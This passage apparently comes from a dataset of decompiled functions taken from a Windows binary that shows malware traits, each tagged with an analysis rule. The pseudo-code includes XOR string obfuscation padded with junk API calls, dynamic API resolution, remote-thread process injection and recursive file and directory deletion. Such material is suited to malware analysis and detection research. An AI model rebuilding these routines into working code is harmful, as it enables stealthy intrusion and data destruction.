*(iVar18 + iVar3) =\n                                     (&stack0xffffff74)[iVar18 % iVar11] ^ (iVar18 + iVar3)[&uStack116 - iVar3];\n                            }\n                            iVar18 = iVar18 + 1;\n                        } while (iVar18 < 0x13);\n                        uVar10 = 0xffffffff;\n                        *0x41cde0 = fcn.00405c35(iVar3);\n                        pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        uVar16 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar16);\n                        uVar16 = (*pcVar8)(0, uVar15);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar16);\n                        piVar6 = piStack132;\n                    }\n                    uVar16 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar6);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar16);\n                    iVar3 = uStack112;\n                }\n                pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar16 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar16);\n                uVar16 = (*pcVar8)(0, iVar19);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar16);\n                piVar12 = piStack120;\n                if (*0x41cde0 == 0) goto code_r0x00403262;\n            }\n            *0x41cde4 = *0x41cde0 >> 0x20;\n            iVar19 = fcn.0040fc00(*0x41cde0, *0x41cde4, 7, 0, *arg_8h, *arg_8h >> 0x1f, 0, 0, 0, 0, lpStartAddress, \n                                  lpStartAddress >> 0x1f, lpParameter, lpParameter >> 0x1f);\n            *piVar12 = iVar19;\n            if (iVar19 == 0) goto code_r0x00403262;\n        }\n        else {\n            if ((*0x41cde8 | *0x41cdec) == 0) {\n                iVar11 = 8;\n                uStack72 = 0xf034404;\n                uStack68 = 0x5c0e6655;\n                uStack64 = CONCAT22(uStack64._2_2_, 0x630b);\n                uStack80 = 0x6367306a;\n                uStack76 = CONCAT22(uStack76._2_2_, 0x4839);\n                uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n                iVar19 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar10);\n                iVar18 = 6;\n                iVar3 = 0;\n                uStack100 = &uStack84 - iVar19;\n                iStack108 = iVar19;\n                do {\n                    iVar20 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n                    if (iVar20 != 0xea05b6) {\n                        *(iVar3 + iVar19) = *(&uStack92 + iVar3 % iVar18) ^ (iVar3 + iVar19)[uStack100];\n                    }\n                    iVar3 = iVar3 + 1;\n                } while (iVar3 < 10);\n                uStack44 = 0x3b240366;\n                uStack40 = 0x3c16513e;\n                uStack36 = 0x1247191d;\n                uStack32 = 0x46242c3a;\n                uStack28 = 0x4c1c2912;\n                piStack120 = 0x78487734;\n                uStack116 = CONCAT31(uStack116._1_3_, 0x4c);\n                uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n                iVar19 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar10);\n                iVar3 = 0;\n                uStack112 = &iStack56 - iVar19;\n                do {\n                    iVar18 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n                    if (iVar18 != 0x7fb2f1) {\n                        *(iVar3 + iVar19) = *(&piStack132 + iVar3 % iVar11) ^ (iVar3 + iVar19)[&iStack56 - iVar19];\n                    }\n                    iVar3 = iVar3 + 1;\n                } while (iVar3 < 0x14);\n                fcn.00405723();\n                piVar12 = piStack120;\n                uVar10 = 0xffffffff;\n                *0x41cde8 = fcn.00405c35(iVar19);\n                uVar16 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar19);\n                pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar16);\n                uVar16 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar12);\n                (*pcVar8)(uVar16);\n                if (*0x41cde8 == 0) goto code_r0x00403262;\n            }\n            *0x41cdec = *0x41cde8 >> 0x20;\n            uVar10 = 0xffffffff;\n            iVar19 = fcn.0040fc00(*0x41cde8, *0x41cdec, 10, 0, *arg_8h, *arg_8h >> 0x1f, 0, 0, 0, 0, 0, 0, 0, 0);\n            if (iVar19 < 0) goto code_r0x00403262;\n        }\n    }\n    else {\n        iStack128 = 5;\n        if (cVar2 != '\\x05') {\n            iVar11 = 8;\n            iStack108 = 0xf034404;\n            uStack104 = 0x5c0e6655;\n            uStack100 = CONCAT22(uStack100._2_2_, 0x630b);\n            uStack80 = 0x6367306a;\n            uStack76 = CONCAT22(uStack76._2_2_, 0x4839);\n            puVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n            iVar19 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n            iVar18 = 6;\n            iVar3 = 0;\n            uStack100 = &piStack120 - iVar19;\n            iStack108 = iVar19;\n            do {\n                iVar20 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n                if (iVar20 != 0xea05b6) {\n                    *(iVar3 + iVar19) = *(&uStack92 + iVar3 % iVar18) ^ (iVar3 + iVar19)[uStack100];\n                }\n                iVar3 = iVar3 + 1;\n            } while (iVar3 < 10);\n            uStack44 = 0x3b240366;\n            uStack40 = 0x3c16513e;\n            uStack36 = 0x1247191d;\n            uStack32 = 0x46242c3a;\n            uStack28 = 0x4c1c2912;\n            piStack120 = 0x78487734;\n            uStack116 = CONCAT31(uStack116._1_3_, 0x4c);\n            uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            iVar19 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar10);\n            iVar3 = 0;\n            uStack112 = &iStack56 - iVar19;\n            do {\n                iVar18 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n                piVar12 = piStack120;\n                if (iVar18 != 0x7fb2f1) {\n                    *(iVar3 + iVar19) = *(&piStack132 + iVar3 % iVar11) ^ (iVar3 + iVar19)[&iStack56 - iVar19];\n                }\n                iVar3 = iVar3 + 1;\n            } while (iVar3 < 0x14);\n            uVar10 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(piStack120, iVar19);\n            pcVar8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar10);\n            uVar10 = 0xffffffff;\n            if (pcVar8 != NULL) {\n                iVar3 = (*pcVar8)(*arg_8h, 0, 0, 0, 0, 0, lpStartAddress, lpParameter, puVar7, &iStack108);\n                if (iVar3 < 0) {\n                    uVar10 = fcn.00409c14();\n                }\n                else {\n                    uStack124 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*puVar7, 30000);\n                    if (uStack124 == 0) {\n                        (*_sym.imp.KERNEL32.dll_GetExitCodeThread)(*puVar7, &uStack124);\n                    }\n                    uVar10 = 0;\n                }\n            }\n            uVar16 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar19);\n            pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar16);\n            uVar16 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar12);\n            (*pcVar8)(uVar16);\n            goto code_r0x00403262;\n        }\n        iVar19 = (*_sym.imp.KERNEL32.dll_CreateRemoteThread)(*arg_8h, 0, 0, lpStartAddress, lpParameter, 0, arg_8h + 3);\n        *piVar12 = iVar19;\n        if (iVar19 == 0) {\n            uVar10 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            goto code_r0x00403262;\n        }\n        uStack124 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(iVar19, 30000);\n        if (uStack124 == 0) {\n            (*_sym.imp.KERNEL32.dll_GetExitCodeThread)(*piVar12, &uStack124);\n        }\n    }\n    uVar10 = 0;\ncode_r0x00403262:\n    *0x41cdec = *0x41cde8 >> 0x20;\n    *0x41cde4 = *0x41cde0 >> 0x20;\n    return uVar10;\n}\n",
        "token_count": 4474
    },
    "00403c2c": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00403c2c(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    code *pcVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    int32_t hFindFile;\n    uint var_2ch;\n    int32_t var_28h;\n    int16_t *var_24h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    int32_t var_14h;\n    int32_t lpString2;\n    int32_t var_ch;\n    uint8_t *lpFindFileData;\n    int32_t lpFileName;\n    \n    iVar7 = 8;\n    var_20h = 0x104;\n    var_34h = fcn.004037f2();\n    lpString2 = in_ECX;\n    if (var_34h != 0) {\n        lpString2 = var_34h;\n    }\n    var_1ch = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString2);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    lpFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n    if (lpFileName != 0) {\n        uVar1 = (*pcVar5)(8, var_1ch * 2 + 0xc);\n        var_14h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if (var_14h != 0) {\n            uVar1 = (*pcVar5)(8, 0x250);\n            lpFindFileData = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            if (lpFindFileData != NULL) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpFileName, lpString2);\n                var_ch = 0x5876496e;\n                hFindFile = 0x58764932;\n                var_2ch._0_2_ = 0x6d31;\n                uVar1 = (*pcVar5)(8, 9);\n                iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                var_18h = 6;\n                iVar4 = 0;\n                var_28h = iVar7;\n                do {\n                    iVar2 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n                    if (iVar2 != 0x408fee) {\n                        *(iVar4 + iVar7) = *(&hFindFile + iVar4 % var_18h) ^ (iVar4 + iVar7)[&var_ch - iVar7];\n                    }\n                    iVar4 = iVar4 + 1;\n                } while (iVar4 < 4);\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, iVar7);\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(var_14h, lpString2);\n                var_40h = 0x686b622f;\n                var_3ch = 0x6259434a;\n                var_38h._0_2_ = 0x6841;\n                hFindFile = 0x68416273;\n                var_2ch._0_2_ = 0x4364;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n                iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                iVar4 = 0;\n                var_24h = &var_40h - iVar7;\n                do {\n                    iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n                    iVar2 = var_14h;\n                    if (iVar3 != 0x3ba91d) {\n                        *(iVar4 + iVar7) = *(&hFindFile + iVar4 % var_18h) ^ *((&var_40h - iVar7) + iVar4 + iVar7);\n                    }\n                    iVar4 = iVar4 + 1;\n                } while (iVar4 < 10);\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(var_14h, iVar7);\n                hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iVar2, lpFindFileData);\n                iVar4 = var_28h;\n                pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                if (hFindFile == -1) {\n                    var_ch = 3;\n                }\n                else {\n                    var_ch = 0;\n                    var_24h = lpFindFileData + 0x2c;\n                    do {\n                        if (*var_24h != 0x2e) {\n                            iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(var_24h);\n                            var_18h = iVar2 + 2 + var_1ch;\n                            if (var_20h < var_18h) {\n                                uVar1 = (*pcVar5)(0, lpFileName);\n                                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                                uVar1 = (*pcVar5)(8, var_18h * 2);\n                                lpFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                                if (lpFileName == 0) {\n                                    var_ch = 8;\n                                    break;\n                                }\n                                var_20h = var_18h;\n                                (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpFileName, lpString2);\n                                (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, iVar4);\n                            }\n                            else {\n                                *(lpFileName + 2 + var_1ch * 2) = 0;\n                            }\n                            (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, var_24h);\n                            if ((*lpFindFileData & 0x10) == 0) {\n                                iVar2 = (*_sym.imp.KERNEL32.dll_DeleteFileW)(lpFileName);\n                            }\n                            else {\n                                var_ch = fcn.00403c2c(arg_8h);\n                                if (var_ch != 0) break;\n                                iVar2 = (*_sym.imp.KERNEL32.dll_RemoveDirectoryW)(lpFileName);\n                            }\n                            if ((iVar2 == 0) && (arg_8h == 0)) {\n                                var_ch = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                                break;\n                            }\n                        }\n                        iVar2 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(hFindFile, lpFindFileData);\n                    } while (iVar2 != 0);\n                }\n                uVar1 = (*pcVar5)(0, iVar7);\n                pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                uVar1 = (*pcVar5)(0, iVar4);\n                (*pcVar6)(uVar1);\n                uVar1 = (*pcVar5)(0, lpFindFileData);\n                (*pcVar6)(uVar1);\n                iVar7 = var_ch;\n            }\n            uVar1 = (*pcVar5)(0, var_14h);\n            (*pcVar6)(uVar1);\n        }\n        if (lpFileName != 0) {\n            uVar1 = (*pcVar5)(0, lpFileName);\n            (*pcVar6)(uVar1);\n        }\n    }\n    if (var_34h != 0) {\n        uVar1 = (*pcVar5)(0, var_34h);\n        (*pcVar6)(uVar1);\n    }\n    return iVar7;\n}\n",
        "token_count": 1786
    },
    "00404f20": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00404f20(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpModuleName;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h = 0xf034404;\n    var_20h = 0x5c0e6655;\n    var_1ch._0_2_ = 0x630b;\n    var_18h = 0x6367306a;\n    var_14h._0_2_ = 0x4839;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_4h = 6;\n    iVar7 = 0;\n    var_8h = &var_24h - iVar2;\n    lpModuleName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        if (iVar3 != 0xea05b6) {\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar2)[var_8h];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_28h = 0x425390f;\n    var_24h = 0x3c051c08;\n    var_20h = 0x1081705;\n    var_1ch._0_2_ = 0x4e26;\n    var_18h = 0x746a4e55;\n    var_14h._0_2_ = 0x726d;\n    uVar1 = (*pcVar5)(8, 0xf);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_28h - iVar2;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        iVar3 = lpModuleName;\n        if (iVar4 != 0x51519) {\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar2)[&var_28h - iVar2];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xe);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, iVar2);\n    uVar1 = (*pcVar5)(var_10h, 0x1f0fff, arg_8h, arg_ch);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*pcVar5)(uVar6);\n    return uVar1;\n}\n",
        "token_count": 844
    },
    "00405723": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00405723(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_10h = 0;\n    if ((*0x41cae8 | *0x41caec) != 0) {\ncode_r0x00405ae6:\n        var_10h = 0x41cae8;\n        goto code_r0x00405aeb;\n    }\n    var_34h._0_2_ = 0x4404;\n    var_34h._2_1_ = 3;\n    var_34h._3_1_ = 0xf;\n    var_30h = 0x5c0e6655;\n    var_2ch._0_1_ = 0xb;\n    var_2ch._1_1_ = 99;\n    var_24h = 0x6367306a;\n    var_20h._0_2_ = 0x4839;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_8h = 6;\n    iVar6 = 0;\n    var_18h = &var_34h - iVar2;\n    var_ch = iVar2;\n    do {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        if (iVar3 != 0xea05b6) {\n            *(iVar6 + iVar2) = *(&var_24h + iVar6 % var_8h) ^ (iVar6 + iVar2)[var_18h];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 10);\n    var_3ch = 0x513d4322;\n    var_38h._0_2_ = 0x7333;\n    var_38h._2_1_ = 0x17;\n    var_38h._3_1_ = 0x5a;\n    var_34h._0_2_ = 0x510e;\n    var_34h._2_1_ = 0x3f;\n    var_34h._3_1_ = 0x44;\n    var_30h = 0x51085c2c;\n    var_2ch._0_1_ = 0x26;\n    var_2ch._1_1_ = 0x54;\n    var_2ch._2_1_ = 0x78;\n    var_24h = 0x347a3478;\n    var_20h._0_2_ = 0x3047;\n    uVar1 = (*pcVar5)(8, 0x14);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar6 = 0;\n    var_14h = &var_3ch - iVar2;\n    var_18h = iVar2;\n    do {\n        iVar4 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n        iVar3 = var_ch;\n        if (iVar4 != 0x4ef610) {\n            *(iVar6 + iVar2) = *(&var_24h + iVar6 % var_8h) ^ (iVar6 + iVar2)[var_14h];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x13);\n    *0x41cae8 = fcn.00405c35(iVar2);\n    if (*0x41cae8 == 0) {\n        uVar1 = (*pcVar5)(0, iVar2);\n        pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\ncode_r0x00405854:\n        (*pcVar7)(uVar1);\n        uVar1 = (*pcVar5)(0, iVar3);\n        (*pcVar7)(uVar1);\n    }\n    else {\n        var_3ch = 0x1f021d6c;\n        var_38h._0_2_ = 0x752e;\n        var_14h = 5;\n        var_38h._2_1_ = 5;\n        var_38h._3_1_ = 0x3f;\n        var_34h._0_2_ = 0x3f0e;\n        var_34h._2_1_ = 0x4e;\n        var_34h._3_1_ = 0x1e;\n        var_30h = 0x53281205;\n        var_2ch._0_1_ = 0xb;\n        var_2ch._1_1_ = 0x35;\n        var_2ch._2_1_ = 0x7a;\n        var_24h = 0x7a516a36;\n        var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x5a);\n        uVar1 = (*pcVar5)(8, 0x14);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar6 = 0;\n        var_1ch = &var_3ch - iVar2;\n        var_4h = iVar2;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n            iVar3 = var_ch;\n            if (iVar4 != 0x6e365b) {\n                *(iVar6 + iVar2) = *(&var_24h + iVar6 % var_14h) ^ (iVar6 + iVar2)[var_1ch];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 0x13);\n        *0x41caf0 = fcn.00405c35(iVar2);\n        iVar2 = var_18h;\n        if (*0x41caf0 == 0) {\n            uVar1 = (*pcVar5)(0, var_4h);\n            pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n        }\n        else {\n            var_3ch = 0x1b023938;\n            var_38h._0_2_ = 0x339;\n            var_38h._2_1_ = 0xb;\n            var_38h._3_1_ = 0x2b;\n            var_34h._0_2_ = 0x3538;\n            var_34h._2_1_ = 0x2f;\n            var_34h._3_1_ = 6;\n            var_30h = 0x133b2d07;\n            var_2ch._0_1_ = 0x26;\n            var_2ch._1_1_ = 0x3b;\n            var_2ch._2_1_ = 0x62;\n            var_24h = 0x7a4f4e62;\n            var_20h._0_2_ = 0x5549;\n            uVar1 = (*pcVar5)(8, 0x14);\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar6 = 0;\n            var_1ch = &var_3ch - iVar2;\n            var_14h = iVar2;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n                iVar3 = var_ch;\n                if (iVar4 != 0xae9da5) {\n                    *(iVar6 + iVar2) = *(&var_24h + iVar6 % var_8h) ^ (iVar6 + iVar2)[var_1ch];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x13);\n            *0x41caf8 = fcn.00405c35(iVar2);\n            iVar2 = var_18h;\n            if (*0x41caf8 != 0) {\n                var_3ch = 0x3b261614;\n                var_38h._0_2_ = 0xf54;\n                var_38h._2_1_ = 0x3e;\n                var_38h._3_1_ = 0x37;\n                var_34h._0_2_ = 0x301a;\n                var_34h._2_1_ = 0x4e;\n                var_34h._3_1_ = 0x21;\n                var_30h = 0x36163228;\n                var_2ch._0_1_ = 0x4d;\n                var_2ch._1_1_ = 7;\n                var_2ch._2_1_ = 0x21;\n                var_2ch._3_1_ = 0xf;\n                var_28h = 0x73;\n                var_24h = 0x5573614e;\n                var_20h._0_2_ = 0x6e39;\n                uVar1 = (*pcVar5)(8, 0x16);\n                iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                iVar6 = 0;\n                var_1ch = &var_3ch - iVar2;\n                do {\n                    iVar4 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n                    iVar3 = var_ch;\n                    if (iVar4 != 0xf854f) {\n                        *(iVar6 + iVar2) = *(&var_24h + iVar6 % var_8h) ^ (iVar6 + iVar2)[var_1ch];\n                    }\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 0x15);\n                *0x41cb00 = fcn.00405c35(iVar2);\n                if (*0x41cb00 != 0) {\n                    uVar1 = (*pcVar5)(0, iVar2);\n                    pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                    uVar1 = (*pcVar5)(0, var_14h);\n                    (*pcVar7)(uVar1);\n                    uVar1 = (*pcVar5)(0, var_4h);\n                    (*pcVar7)(uVar1);\n                    uVar1 = (*pcVar5)(0, var_18h);\n                    (*pcVar7)(uVar1);\n                    uVar1 = (*pcVar5)(0, iVar3);\n                    (*pcVar7)(uVar1);\n                    goto code_r0x00405ae6;\n                }\n                uVar1 = (*pcVar5)(0, iVar2);\n                pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                uVar1 = (*pcVar5)(0, var_14h);\n                (*pcVar7)(uVar1);\n                uVar1 = (*pcVar5)(0, var_4h);\n                (*pcVar7)(uVar1);\n                uVar1 = (*pcVar5)(0, var_18h);\n                goto code_r0x00405854;\n            }\n            uVar1 = (*pcVar5)(0, var_14h);\n            pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4h);\n        }\n        (*pcVar5)(uVar1);\n        pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        (*pcVar5)(uVar1);\n        uVar1 = (*pcVar7)(0, iVar3);\n        (*pcVar5)(uVar1);\n    }\ncode_r0x00405aeb:\n    *0x41cafc = *0x41caf8 >> 0x20;\n    *0x41cb04 = *0x41cb00 >> 0x20;\n    *0x41caf4 = *0x41caf0 >> 0x20;\n    *0x41caec = *0x41cae8 >> 0x20;\n    return var_10h;\n}\n",
        "token_count": 2929
    },
    "00405db6": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.00405db6(uint param_1, uint param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t lpLibFileName;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_30h = 0x56155a5f;\n    var_2ch = 0x5a5e550e;\n    var_28h._0_2_ = 0x5665;\n    lpLibFileName = 0x56655a30;\n    var_18h._0_2_ = 0x556b;\n    var_20h = param_2;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_8h = 6;\n    iVar8 = 0;\n    var_14h = &var_30h - iVar3;\n    var_ch = iVar3;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n        if (iVar4 != 0x1c8629) {\n            *(iVar8 + iVar3) = *(&lpLibFileName + iVar8 % var_8h) ^ (iVar8 + iVar3)[var_14h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 10);\n    var_34h = 0x3a7c2920;\n    var_30h = 0x4f416918;\n    var_2ch = 0x5a381a5d;\n    var_14h = 0x76396173;\n    var_10h._0_2_ = 0x5a54;\n    uVar2 = (*pcVar6)(8, 0xd);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    lpLibFileName = iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetMessagePos)();\n        if (iVar4 != 0x3a8b20) {\n            *(iVar8 + iVar3) = *(&var_14h + iVar8 % var_8h) ^ (iVar8 + iVar3)[&var_34h - iVar3];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xc);\n    var_34h = 0x5a205c19;\n    var_30h = 0x204c0f3f;\n    var_2ch = 0x513e2655;\n    var_28h._0_2_ = 0x3612;\n    var_8h = 0x3645344a;\n    var_4h._0_1_ = 0x53;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xf);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    var_14h = &var_34h - iVar3;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_CreateMenu)();\n        iVar4 = lpLibFileName;\n        if (iVar5 != 0xb11c04) {\n            var_14h = 5;\n            *(iVar8 + iVar3) = *(&var_8h + iVar8 % 5) ^ (iVar8 + iVar3)[&var_34h - iVar3];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xe);\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar3);\n    pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    uVar7 = (*pcVar6)(0, var_ch, var_24h, var_20h, 0, 0);\n    if (0x20 < uVar7) {\n        uVar7 = 0;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n    